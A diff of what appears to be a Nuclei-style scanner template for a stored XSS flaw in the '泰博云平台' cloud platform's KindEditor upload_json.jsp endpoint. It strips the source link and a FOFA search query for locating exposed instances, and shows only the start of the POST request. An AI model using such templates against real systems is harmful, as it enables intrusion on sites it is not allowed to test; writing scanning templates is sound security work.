@@ -3,12 +3,8 @@ info:
   name: 泰博云平台upload_json存在存储型xss漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pm3lcz1blga2ppag'
+  description: ''
   tags: file-upload,xss,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pm3lcz1blga2ppag
-    fofa: title="泰博云平台"
 http:
 - raw:
   - 'POST /resources/kindeditor/jsp/upload_json.jsp?dir=image HTTP/1.1
